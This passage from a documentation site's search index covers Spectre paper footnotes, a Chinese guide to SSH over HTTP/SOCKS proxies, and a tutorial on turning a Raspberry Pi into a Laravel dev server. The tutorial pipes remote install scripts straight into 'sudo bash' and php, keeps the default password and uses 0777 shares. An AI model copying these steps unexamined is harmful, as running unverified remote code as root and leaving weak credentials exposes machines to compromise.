This PoC won't work on CPUs with SMAP support; however, that is not a fundamental limitation. [5] linux-image-4.9.0-3-amd64 at version 4.9.30-2+deb9u2 (available at http://snapshot.debian.org/archive/debian/20170701T224614Z/pool/main/l/linux/linux-image-4.9.0-3-amd64_4.9.30-2%2Bdeb9u2_amd64.deb , sha256 5f950b26aa7746d75ecb8508cc7dab19b3381c9451ee044cd2edfd6f5efff1f8, signed via Release.gpg , Release , Packages.xz ); that was the current distro kernel version when I set up the machine. It is very unlikely that the PoC works with other kernel versions without changes; it contains a number of hardcoded addresses/offsets. [6] The phone was running an Android build from May 2017. [7] https://software.intel.com/en-us/articles/intel-sdm [8] https://software.intel.com/en-us/articles/avoiding-and-identifying-false-sharing-among-threads , section \"background\" [9] More than 215 mappings would be more efficient, but the kernel places a hard cap of 216 on the number of VMAs that a process can have. [10] Intel's optimization manual states that \"In the first implementation of HT Technology, the physical execution resources are shared and the architecture state is duplicated for each logical processor\", so it would be plausible for predictor state to be shared. While predictor state could be tagged by logical core, that would likely reduce performance for multithreaded processes, so it doesn't seem likely. [11] In case the history buffer was a bit bigger than we had measured, we added some margin - in particular because we had seen slightly different history buffer lengths in different experiments, and because 26 isn't a very round number. [12] The basic idea comes from http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf , section IV, although the authors of that paper still used hugepages. \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html","title":"References"},{"location":"RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/","text":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5 \u4ece\u76ee\u524d\u7f51\u4e0a\u7684\u8d44\u6599\u6765\u770b\uff0c\u901a\u8fc7\u4ee3\u7406\u6765\u8fde\u63a5 ssh \u67092\u79cd\u65b9\u5f0f\uff1a \u4e00\u79cd\u662f\u7528Corkscrew\u5b9e\u73b0http\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c corkscrew\u5b98\u65b9\u4e3b\u9875 \uff1b \u53e6\u5916\u4e00\u79cd\u662f\u5229\u7528connect\u80fd\u5b9e\u73b0Sock5\u548chttp\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c connect\u5b98\u65b9\u4e3b\u9875 \uff08connect\u9879\u76ee\u73b0\u5df2\u64a4\u51fa\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\uff1a \u70b9\u8fd9\u91cc \uff09\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bCorkscrew\uff0c\u9996\u5148\u5f3a\u8c03\u7684\u662f\u5b83\u53ea\u80fd\u4f7f\u7528http\u4ee3\u7406\uff0c\u6211\u8bd5\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u53d1\u73b0\u4e0d\u6210\u529f\uff0c\u5176\u539f\u56e0\u5c31\u662f\u6a21\u62df\u7684\u4ee3\u7406\u4e0d\u662fhttp\u4ee3\u7406\uff0c\u81f3\u4e8ehttp\u4ee3\u7406\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u5927\u5bb6\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u540e\u62ff\u6765\u4f7f\u7528\u3002 \u90a3\u4e48\u5982\u4f55\u6765\u4f7f\u7528\u5b83\uff1a 1.\u89e3\u538b\u5e76\u7f16\u8bd1\u5b89\u88c5\uff1a wget http://www.agroman.net/corkscrew/corkscrew-2.0.tar.gztar -xzvf corkscrew-2.0.tar.gz # [..] cd corkscrew ./configure make install 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a Host * ProxyCommand corkscrew http-proxy.example.com 8080 %h %p \u6ce8\u610fhttp-proxy.example.com\u4e3ahttp\u4ee3\u7406\u5730\u5740\u6839\u636e\u5b9e\u9645\u66f4\u6539\uff0c\u540e\u9762\u76848080\u4e3ahttp \u4ee3\u7406 \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u4e86\uff1a ssh root@ssh.malu.me -p 22 \u6bd4\u5982\u4ee5\u4e0a\u662f\u964b\u5ba4\u535a\u5ba2\u6f14\u793a\u7684\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7b2c\u4e8c\u6b21\u767b\u5f55\u65f6\u5c31\u53ef\u770b\u5230\u4e0a\u6b21\u767b\u5f55ip\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e86\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecdconnect\uff0c\u8be5\u7a0b\u5e8f\u5b98\u65b9\u63d0\u4f9b\u7684\u662fc\u6e90\u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u9700\u8981\u7f16\u8bd1\uff1a 1.\u4e0b\u8f7d\u5e76gcc\u7f16\u8bd1\uff1a wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect cp connect /usr/local/bin 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a ## Outside of the firewall, with HTTP proxy Host * ProxyCommand connect -H proxy.local.net:8080 %h %p \u4ee5\u4e0a\u662f\u900f\u8fc7http\u4ee3\u7406\uff0c\u5982\u679c\u662fsocks\u4ee3\u7406\u5219\u628a-H\u6539\u4e3a-S\uff1a ## Outside of the firewall, use connect command with SOCKS conenction. Host * ProxyCommand connect -S socks.local.net %h %p \u4ee5\u4e0a\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\uff0c\u6ce8\u610fsocks.local.net\u540c\u6837\u662f\u9700\u8981\u7528\u81ea\u5df1\u7684socks\u4ee3\u7406\u670d\u52a1\u5668\u66ff\u6362\u7684\uff0c\u5728\u7aef\u53e3\u914d\u7f6e\u4e0a\u662f\u52a0\u201c\uff1a\u7aef\u53e3\u53f7\u201d\u6765\u89e3\u51b3\u4e0eCorkscrew\u7684\u914d\u7f6e\u4e0d\u540c\u3002 \u5982\u679c\u662fWindows\u4e0b\u4f7f\u7528 cygwin \u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d connect.exe \uff0c\u653e\u5728c:\\window\\\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540c\u6837\u7684\u5728$HOME/.ssh/config\u5199\u5165\u76f8\u5e94\u914d\u7f6e\u3002 \u4ee5\u4e0a\u9700\u8981\u7528\u5230\u7684\u6587\u4ef6\u5907\u4efd\u5728\u964b\u5ba4\u535a\u5ba2-\u4e0b\u8f7d-\u6e90\u4ee3\u7801\u91cc\uff1a http://bolg.malu.me/down \u539f\u6587\u94fe\u63a5\uff1a http://bolg.malu.me/html/2011/1809.html","title":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5"},{"location":"RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/#ssh","text":"\u4ece\u76ee\u524d\u7f51\u4e0a\u7684\u8d44\u6599\u6765\u770b\uff0c\u901a\u8fc7\u4ee3\u7406\u6765\u8fde\u63a5 ssh \u67092\u79cd\u65b9\u5f0f\uff1a \u4e00\u79cd\u662f\u7528Corkscrew\u5b9e\u73b0http\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c corkscrew\u5b98\u65b9\u4e3b\u9875 \uff1b \u53e6\u5916\u4e00\u79cd\u662f\u5229\u7528connect\u80fd\u5b9e\u73b0Sock5\u548chttp\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c connect\u5b98\u65b9\u4e3b\u9875 \uff08connect\u9879\u76ee\u73b0\u5df2\u64a4\u51fa\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\uff1a \u70b9\u8fd9\u91cc \uff09\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bCorkscrew\uff0c\u9996\u5148\u5f3a\u8c03\u7684\u662f\u5b83\u53ea\u80fd\u4f7f\u7528http\u4ee3\u7406\uff0c\u6211\u8bd5\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u53d1\u73b0\u4e0d\u6210\u529f\uff0c\u5176\u539f\u56e0\u5c31\u662f\u6a21\u62df\u7684\u4ee3\u7406\u4e0d\u662fhttp\u4ee3\u7406\uff0c\u81f3\u4e8ehttp\u4ee3\u7406\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u5927\u5bb6\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u540e\u62ff\u6765\u4f7f\u7528\u3002 \u90a3\u4e48\u5982\u4f55\u6765\u4f7f\u7528\u5b83\uff1a 1.\u89e3\u538b\u5e76\u7f16\u8bd1\u5b89\u88c5\uff1a wget http://www.agroman.net/corkscrew/corkscrew-2.0.tar.gztar -xzvf corkscrew-2.0.tar.gz # [..] cd corkscrew ./configure make install 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a Host * ProxyCommand corkscrew http-proxy.example.com 8080 %h %p \u6ce8\u610fhttp-proxy.example.com\u4e3ahttp\u4ee3\u7406\u5730\u5740\u6839\u636e\u5b9e\u9645\u66f4\u6539\uff0c\u540e\u9762\u76848080\u4e3ahttp \u4ee3\u7406 \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u4e86\uff1a ssh root@ssh.malu.me -p 22 \u6bd4\u5982\u4ee5\u4e0a\u662f\u964b\u5ba4\u535a\u5ba2\u6f14\u793a\u7684\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7b2c\u4e8c\u6b21\u767b\u5f55\u65f6\u5c31\u53ef\u770b\u5230\u4e0a\u6b21\u767b\u5f55ip\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e86\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecdconnect\uff0c\u8be5\u7a0b\u5e8f\u5b98\u65b9\u63d0\u4f9b\u7684\u662fc\u6e90\u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u9700\u8981\u7f16\u8bd1\uff1a 1.\u4e0b\u8f7d\u5e76gcc\u7f16\u8bd1\uff1a wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect cp connect /usr/local/bin 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a ## Outside of the firewall, with HTTP proxy Host * ProxyCommand connect -H proxy.local.net:8080 %h %p \u4ee5\u4e0a\u662f\u900f\u8fc7http\u4ee3\u7406\uff0c\u5982\u679c\u662fsocks\u4ee3\u7406\u5219\u628a-H\u6539\u4e3a-S\uff1a ## Outside of the firewall, use connect command with SOCKS conenction. Host * ProxyCommand connect -S socks.local.net %h %p \u4ee5\u4e0a\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\uff0c\u6ce8\u610fsocks.local.net\u540c\u6837\u662f\u9700\u8981\u7528\u81ea\u5df1\u7684socks\u4ee3\u7406\u670d\u52a1\u5668\u66ff\u6362\u7684\uff0c\u5728\u7aef\u53e3\u914d\u7f6e\u4e0a\u662f\u52a0\u201c\uff1a\u7aef\u53e3\u53f7\u201d\u6765\u89e3\u51b3\u4e0eCorkscrew\u7684\u914d\u7f6e\u4e0d\u540c\u3002 \u5982\u679c\u662fWindows\u4e0b\u4f7f\u7528 cygwin \u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d connect.exe \uff0c\u653e\u5728c:\\window\\\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540c\u6837\u7684\u5728$HOME/.ssh/config\u5199\u5165\u76f8\u5e94\u914d\u7f6e\u3002 \u4ee5\u4e0a\u9700\u8981\u7528\u5230\u7684\u6587\u4ef6\u5907\u4efd\u5728\u964b\u5ba4\u535a\u5ba2-\u4e0b\u8f7d-\u6e90\u4ee3\u7801\u91cc\uff1a http://bolg.malu.me/down \u539f\u6587\u94fe\u63a5\uff1a http://bolg.malu.me/html/2011/1809.html","title":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/","text":"Using Raspberry Pi for Laravel developing | by Ronie Meque | Medium Using Raspberry Pi for Laravel developing This article can be viewed in portuguese here . If you are a Laravel developer and can\u2019t afford a Mac or can\u2019t migrate definitely for Linux distro because it lacks an app (Photoshop in my case), chances are high that you already got a bit frustatred in doing so in a Windows. If you also use Laravel Mix for some assets managing, like babel and sass , you have probabably got really frustrated at a point. It doesn\u2019t matter how powerfull your Windows rig is, it\u2019s going to be slow \u2014 mainly doing Composer install or handling Node.js. There are a few options out there though: Git Bash. It is possible to run everything you would do in a Linux distro inside the Git Bash shell that comes with Git for Windows, and it works really nice! Until then, this was my favorite method. Homestead. Homestead is a nice little Ubuntu Vagrant box packed with everything you might need to do some Laravel developing, but according to personal experience and community feedback, it kinda sucks in Windows, in matters of speed mainly. A dedicated Linux for the job. This is the case we will cover here, more specifically using a Raspberry Pi (It\u2019s very cheap). If you have an old computer lying around it is probably worth a try either! Anyway, what we want: A Raspberry Pi device running a Laravel 5.5 application with PHP\u2019s built-in server, automatically compiling frontend assets with Laravel Mix and serving all through the local network. We also want the project\u2019s folder to be easily accessible through our local network, making it feel like we are editing the files from Windows inside our Raspberry Pi. Requirements: Raspberry Pi 3 (it will probably work on older models too though) Local network Lastest Raspbian (currently Stretch) A decent command line in Windows. What I recommend: Git Bash alongside the Cmder or Hyper emulators. If you can\u2019t or don\u2019t want to use Git Bash, Cmder includes Clink which provides a few usefull Unix commands in Window\u2019s command line. Basic Raspberry Pi setup (OPTIONAL) Let\u2019s configure remote access to the Pi, expand the filesystem and disable the GUI. Remote access With a keyboard and screen conected to your Pi (soon you won\u2019t need them anymore) Enter sudo raspi-config in the CLI. Choose Interfacing Options and after SSH Pick yes and close the menu Now execute hostname -I to find out what is your Pi\u2019s local IP. Back to the computer, we can now access the Pi with ssh pi@YOUR-PI-IP Example: ssh pi@192.168.1.38 The default password is \u201craspberry\u201d. It\u2019s likelly that in the first connection you will have to type yes to confirm you trust the host. Let\u2019s configure a key so we won\u2019t need to type the password again. If you don\u2019t have a key on your PC, generate one using ssh-keygen -t rsa and confirm all the questions with an enter. The key will be stored in a .ssh folder in your home folder inside two files: id_rsa and id_rsa.pub . Back to your PC now execute ssh-copy-id -i path/to/id_rsa.pub pi@YOUR-PI-IP Example: ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.1.38 Type the password for the last time and it\u2019s done! \ud83d\ude2e Disabling the GUI and expanding the filesystem Since we will do all the work in the remote CLI, the GUI and keyboard are no longer needed. We will also expand the filesystem to use the whole SD Card (Raspbian doesn\u2019t do that by default). In your remote CLI type sudo raspi-config Navigate to Boot options , then Desktop / CLI and select Console Back to the main menu, go to Advanced Options and then Expand Filesystem. When requested, reboot your Pi. Sharing the Raspberry files across your local network Depending on a FTP, SFTP and such here would just blow away all the fun, so let\u2019s setup a folder sharing from your Pi to your Windows. After this, you will be able to open your project\u2019s folder in your editor or IDE naturally like it was inside Windows. In your Pi, do the following: sudo apt install samba samba-common-bin -y sudo vim /etc/samba/smb.conf (Replace vim with any CLI editor you like or simply install vim with sudo apt install vim -y ) Find the following lines and edit them like follows: (The workgroup name can be anything alphanumeric) workgroup = nicetidygroupy wins support = yes Add this at the end of the file (In this case we are sharing the whole home folder from the Pi user): [pihome] comment= Pi Home path=/home/pi browseable=Yes writeable=Yes only guest=no create mask=0777 directory mask=0777 public=no Save smb.conf file and do configure the sharing login with smbpasswd -a pi (Since this a local development server, I recommend using the same password from the Pi user \u2014 by default \u201craspberry\u201d) Restart samba so we can be sure everything will be ok: sudo /etc/init.d/samba restart If everything went well, it\u2019s likelly your Pi will now appear in your Windows network tab. When asked for a password, use the login \u201cpi\u201d alongside the password you defined in the last step. Sharing Pi\u2019s home to WindowsIf your devices are connected through cable, the experience here will be just perfect, but it works really well in Wi-Fi too. Installing PHP 7.0 and Composer on Raspberry Pi In order to install PHP 7.0 and some of Laravel\u2019s mandatory and opcional dependencies, execute the following: sudo apt install php7.0 php7.0-curl php7.0-gd php7.0-imap php7.0-json php7.0-mcrypt php7.0-mysql php7.0-opcache php7.0-xmlrpc php7.0-xml php7.0-fpm php7.0-zip -y Check if everything is ok by doing php -v . The output should be something like: It works! Installing Composer Now that we have PHP, do the following to install Composer: $ curl -sS https://getcomposer.org/installer | php$ sudo mv composer.phar /usr/local/bin/composer Check if went well with composer --version \ud83c\udd92 Installing MariaDB (mysql) on Raspberry Pi MariaDB is and open source alternative to Oracle\u2019s MySQL. In order to install it, execute: sudo apt install mariadb-server mariadb-client -y Once again check if everything worked with mysql --version : \ud83c\udf7b After installed you can access it with sudo mysql -u root -p . Considering we are setting up a development only environment here, let\u2019s make things easier by creating a new user and giving it full access to MariaDB. This will discard the need to sudo in MariaDB. Execute sudo mysql -u root -p to access MariaDB and then do the following queries, replacing what is in bold with what you prefer. CREATE USER '**user**'@'localhost' IDENTIFIED BY '**pass**';GRANT ALL PRIVILEGES ON * . * TO '**user**'@'localhost';FLUSH PRIVILEGES; After that you can access MariaDB by simply doing mysql -u **usuario** -p . You can also use these credentials in your application. Installing Node.js on Raspberry Pi (OPTIONAL) If you do assets compiling in your project, you will likely need to configure Node.js. Raspbian\u2019s current version comes with Node.js 4. by default, which doesn\u2019t work nice with most of Laravel Mix dependencies, for example. Instead, let\u2019s configure the 8. version. Execute the following: $ curl -sL <https://deb.nodesource.com/setup_8.x> | sudo -E bash -$ sudo apt install nodejs Check if everything is ok with node -v Creating a new Laravel app on Raspberry Pi With all the system dependecies set, let\u2019s create a new project. In case you are cloning an existing one, head down to the bottom of this section. Create a new folder to hold our projects with mkdir ~/projects and access it with cd ~/projects Execute the following to create a new project based on Laravel\u2019s default skeleton: composer create-project --prefer-dist laravel/laravel the-coolest-project-name Everything should run fine and the project will be created! If composer complains that something is missing, try searching the package\u2019s name and installing it with sudo apt install . In this step Composer already installed all of Laravel\u2019s backend dependencies. Cloning an existing project In case the project already exists, acess the projects folder created in the last step and do the following: Clone your project using git. Example: git clone git@github.com:roniemeque/nice-little-app.git acess the created folder with cd nice-little-app and install all of Laravel\u2019s backend dependencies with composer install configure your .env file, generate the app\u2019s key, run your migrations and the usual Laravel setup. Installing the dependencies for assets manipulation with NPM If you use some kind of compilling, polifylling, minification and such and you have installed Node.js in your Pi, now it\u2019s time to install the project\u2019s dependencies. Whether it\u2019s a new or existing app, execute npm install in its folder. Important detail: the output of npm\u2019s installs in Raspbian is a lot more verbose and slower than the usual, but don\u2019t worry because after everything is installed it will work like it should, depending on your project depencies, of course. Laravel Mix\u2019s dependencies run perfectly in here so far! Now that everything is working, let\u2019s head to the final steps: Running Laravel on Raspberry Pi with PHP\u2019s built-in server Let\u2019s use artisan to manage the server. Execute the following: php artisan serve --host=YOUR-PI-IP (If you can\u2019t remember the IP of your Pi, use hostname -I to see it). Get ready now, it\u2019s coming! In your PC, browse to http://YOUR-PI-IP:8000 and see the result. Example: http://192.168.1.38:8000 Automatically manipulating frontend assets with Laravel Mix on Raspberry Pi If you don\u2019t use Laravel Mix , oh boy you should. It\u2019s an excellent wrapper around Webpack that makes working with Webpack seems like a breeze. You can even use it in non-laravel projects! Access your Pi in a new console tab without closing the one running the server and execute npm run dev inside your project\u2019s folder. If all of your Sass, Less, Coffe, Typescript and etcetera compiled correctly, let\u2019s set the compiling to happen automatically everytime a file is saved with npm run watch . Note on Browsersync If you use Browsersync alongside your Laravel Mix, you can still use it here, but not directly, of course. Configure your Browsersync so it won\u2019t open any browser by default and you will be able to use it by browsing to the remote host Browsersync provides. (It will pop-up in the first output from npm run watch ) \u2014 your online option must be set to true also, but in Laravel Mix it is set by default. If you would like to disable Browsersync at all everytime you use your Pi for developing but you don\u2019t want to keep changing the webpack.mix.js settings and discarding it everytime, Laravel provides a nice way to solve this: In your .env file, add something like this: MIX_BROWSERSYNC=false Now change your Browsersync call inside you webpack.mix.js file so it is surrounded by the following condition: if(process.env.MIX_BROWSERSYNC){ mix.browserSync({your options go here}); } With that you can tell Laravel Mix that you don\u2019t want Browsersync in this environment. Don\u2019t forget to set it to true in the environments you want it enabled. And that\u2019s it At this point you probably have a very decent and fine development environment on your Pi. It is also portable! Don\u2019t forget to always check your IP and network settings in case you plan on carrying it around though. It\u2019s likelly there are tons of ways to accomplish this procedure and it\u2019s possible by the time you read this some things will be outdated. It\u2019s very important to always pay attention to the names of the packages you are installing and the output of the commands you run. If you are doing this it\u2019s quite probable you are used to being frustrated with broken packages or doing a lot of Google to fix tiny hidden errors that will only happen in your system. I really hope this post will help anyone that tries to accomplish a similar result in using the Raspberry Pi as a development server, regardless of your PHP framework, versions and project requirements. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/@roniemeque/using-raspberry-pi-for-laravel-developing-30dabcdeba43","title":"Using Raspberry Pi for Laravel developing"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#using-raspberry-pi-for-laravel-developing-by-ronie-meque-medium","text":"","title":"Using Raspberry Pi for Laravel developing | by Ronie Meque | Medium"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#using-raspberry-pi-for-laravel-developing","text":"This article can be viewed in portuguese here . If you are a Laravel developer and can\u2019t afford a Mac or can\u2019t migrate definitely for Linux distro because it lacks an app (Photoshop in my case), chances are high that you already got a bit frustatred in doing so in a Windows. If you also use Laravel Mix for some assets managing, like babel and sass , you have probabably got really frustrated at a point. It doesn\u2019t matter how powerfull your Windows rig is, it\u2019s going to be slow \u2014 mainly doing Composer install or handling Node.js. There are a few options out there though: Git Bash. It is possible to run everything you would do in a Linux distro inside the Git Bash shell that comes with Git for Windows, and it works really nice! Until then, this was my favorite method. Homestead. Homestead is a nice little Ubuntu Vagrant box packed with everything you might need to do some Laravel developing, but according to personal experience and community feedback, it kinda sucks in Windows, in matters of speed mainly. A dedicated Linux for the job. This is the case we will cover here, more specifically using a Raspberry Pi (It\u2019s very cheap). If you have an old computer lying around it is probably worth a try either! Anyway, what we want: A Raspberry Pi device running a Laravel 5.5 application with PHP\u2019s built-in server, automatically compiling frontend assets with Laravel Mix and serving all through the local network. We also want the project\u2019s folder to be easily accessible through our local network, making it feel like we are editing the files from Windows inside our Raspberry Pi.","title":"Using Raspberry Pi for Laravel developing"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#requirements","text":"Raspberry Pi 3 (it will probably work on older models too though) Local network Lastest Raspbian (currently Stretch) A decent command line in Windows. What I recommend: Git Bash alongside the Cmder or Hyper emulators. If you can\u2019t or don\u2019t want to use Git Bash, Cmder includes Clink which provides a few usefull Unix commands in Window\u2019s command line.","title":"Requirements:"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#basic-raspberry-pi-setup-optional","text":"Let\u2019s configure remote access to the Pi, expand the filesystem and disable the GUI.","title":"Basic Raspberry Pi setup (OPTIONAL)"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#remote-access","text":"With a keyboard and screen conected to your Pi (soon you won\u2019t need them anymore) Enter sudo raspi-config in the CLI. Choose Interfacing Options and after SSH Pick yes and close the menu Now execute hostname -I to find out what is your Pi\u2019s local IP. Back to the computer, we can now access the Pi with ssh pi@YOUR-PI-IP Example: ssh pi@192.168.1.38 The default password is \u201craspberry\u201d. It\u2019s likelly that in the first connection you will have to type yes to confirm you trust the host. Let\u2019s configure a key so we won\u2019t need to type the password again. If you don\u2019t have a key on your PC, generate one using ssh-keygen -t rsa and confirm all the questions with an enter. The key will be stored in a .ssh folder in your home folder inside two files: id_rsa and id_rsa.pub . Back to your PC now execute ssh-copy-id -i path/to/id_rsa.pub pi@YOUR-PI-IP Example: ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.1.38 Type the password for the last time and it\u2019s done! \ud83d\ude2e","title":"Remote access"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#disabling-the-gui-and-expanding-the-filesystem","text":"Since we will do all the work in the remote CLI, the GUI and keyboard are no longer needed. We will also expand the filesystem to use the whole SD Card (Raspbian doesn\u2019t do that by default). In your remote CLI type sudo raspi-config Navigate to Boot options , then Desktop / CLI and select Console Back to the main menu, go to Advanced Options and then Expand Filesystem. When requested, reboot your Pi.","title":"Disabling the GUI and expanding the filesystem"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#sharing-the-raspberry-files-across-your-local-network","text":"Depending on a FTP, SFTP and such here would just blow away all the fun, so let\u2019s setup a folder sharing from your Pi to your Windows. After this, you will be able to open your project\u2019s folder in your editor or IDE naturally like it was inside Windows. In your Pi, do the following: sudo apt install samba samba-common-bin -y sudo vim /etc/samba/smb.conf (Replace vim with any CLI editor you like or simply install vim with sudo apt install vim -y ) Find the following lines and edit them like follows: (The workgroup name can be anything alphanumeric) workgroup = nicetidygroupy wins support = yes Add this at the end of the file (In this case we are sharing the whole home folder from the Pi user): [pihome] comment= Pi Home path=/home/pi browseable=Yes writeable=Yes only guest=no create mask=0777 directory mask=0777 public=no Save smb.conf file and do configure the sharing login with smbpasswd -a pi (Since this a local development server, I recommend using the same password from the Pi user \u2014 by default \u201craspberry\u201d) Restart samba so we can be sure everything will be ok: sudo /etc/init.d/samba restart If everything went well, it\u2019s likelly your Pi will now appear in your Windows network tab. When asked for a password, use the login \u201cpi\u201d alongside the password you defined in the last step. Sharing Pi\u2019s home to WindowsIf your devices are connected through cable, the experience here will be just perfect, but it works really well in Wi-Fi too.","title":"Sharing the Raspberry files across your local network"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-php-70-and-composer-on-raspberry-pi","text":"In order to install PHP 7.0 and some of Laravel\u2019s mandatory and opcional dependencies, execute the following: sudo apt install php7.0 php7.0-curl php7.0-gd php7.0-imap php7.0-json php7.0-mcrypt php7.0-mysql php7.0-opcache php7.0-xmlrpc php7.0-xml php7.0-fpm php7.0-zip -y Check if everything is ok by doing php -v . The output should be something like: It works!","title":"Installing PHP 7.0 and Composer on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-composer","text":"Now that we have PHP, do the following to install Composer: $ curl -sS https://getcomposer.org/installer | php$ sudo mv composer.phar /usr/local/bin/composer Check if went well with composer --version \ud83c\udd92","title":"Installing Composer"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-mariadb-mysql-on-raspberry-pi","text":"MariaDB is and open source alternative to Oracle\u2019s MySQL. In order to install it, execute: sudo apt install mariadb-server mariadb-client -y Once again check if everything worked with mysql --version : \ud83c\udf7b After installed you can access it with sudo mysql -u root -p . Considering we are setting up a development only environment here, let\u2019s make things easier by creating a new user and giving it full access to MariaDB. This will discard the need to sudo in MariaDB. Execute sudo mysql -u root -p to access MariaDB and then do the following queries, replacing what is in bold with what you prefer. CREATE USER '**user**'@'localhost' IDENTIFIED BY '**pass**';GRANT ALL PRIVILEGES ON * . * TO '**user**'@'localhost';FLUSH PRIVILEGES; After that you can access MariaDB by simply doing mysql -u **usuario** -p . You can also use these credentials in your application.","title":"Installing MariaDB (mysql) on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-nodejs-on-raspberry-pi-optional","text":"If you do assets compiling in your project, you will likely need to configure Node.js. Raspbian\u2019s current version comes with Node.js 4. by default, which doesn\u2019t work nice with most of Laravel Mix dependencies, for example. Instead, let\u2019s configure the 8. version. Execute the following: $ curl -sL <https://deb.nodesource.com/setup_8.x> | sudo -E bash -$ sudo apt install nodejs Check if everything is ok with node -v","title":"Installing Node.js on Raspberry Pi (OPTIONAL)"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#creating-a-new-laravel-app-on-raspberry-pi","text":"With all the system dependecies set, let\u2019s create a new project. In case you are cloning an existing one, head down to the bottom of this section. Create a new folder to hold our projects with mkdir ~/projects and access it with cd ~/projects Execute the following to create a new project based on Laravel\u2019s default skeleton: composer create-project --prefer-dist laravel/laravel the-coolest-project-name Everything should run fine and the project will be created! If composer complains that something is missing, try searching the package\u2019s name and installing it with sudo apt install . In this step Composer already installed all of Laravel\u2019s backend dependencies.","title":"Creating a new Laravel app on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#cloning-an-existing-project","text":"In case the project already exists, acess the projects folder created in the last step and do the following: Clone your project using git. Example: git clone git@github.com:roniemeque/nice-little-app.git acess the created folder with cd nice-little-app and install all of Laravel\u2019s backend dependencies with composer install configure your .env file, generate the app\u2019s key, run your migrations and the usual Laravel setup.","title":"Cloning an existing project"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-the-dependencies-for-assets-manipulation-with-npm","text":"If you use some kind of compilling, polifylling, minification and such and you have installed Node.js in your Pi, now it\u2019s time to install the project\u2019s dependencies. Whether it\u2019s a new or existing app, execute npm install in its folder. Important detail: the 